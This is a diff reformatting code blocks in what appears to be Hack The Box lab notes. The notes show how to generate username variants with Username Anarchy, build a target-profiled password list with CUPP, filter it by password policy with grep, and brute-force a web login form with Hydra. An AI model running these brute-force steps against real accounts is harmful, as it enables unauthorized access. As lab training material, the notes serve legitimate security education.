@@ -16,8 +16,7 @@ Human creativity knows no bounds, and usernames often become a canvas for person
 
 This is where `Username Anarchy` shines. It accounts for initials, common substitutions, and more, casting a wider net in your quest to uncover the target's username:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ./username-anarchy -l
 
 Plugin name             Example
@@ -50,8 +49,7 @@ Last                    Key
 
 First, install ruby, and then pull the `Username Anarchy` git to get the script:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo apt install ruby -y
 hiimeins@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
 hiimeins@htb[/htb]$ cd username-anarchy
@@ -59,8 +57,7 @@ hiimeins@htb[/htb]$ cd username-anarchy
 
 Next, execute it with the target's first and last names. This will generate possible username combinations.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
 ```
 
@@ -115,15 +112,13 @@ This process results in a highly personalized wordlist, significantly more likel
 
 If you're using Pwnbox, CUPP is likely pre-installed. Otherwise, install it using:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo apt install cupp -y
 ```
 
 Invoke CUPP in interactive mode, CUPP will guide you through a series of questions about your target, enter the following as prompted:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cupp -i
 
 ___________
@@ -177,8 +172,7 @@ We now have a generated a username list (`jane_smith_usernames.txt`) and a passw
 
 As we did earlier, we can use grep to filter that password list to match that policy:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
 ```
 
@@ -186,8 +180,7 @@ This command efficiently filters `jane.txt` to match the provided policy, from ~
 
 Use the two generated lists in Hydra against the target to brute-force the login form. Remember to change the target info for your instance.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ hydra -L jane_smith_usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
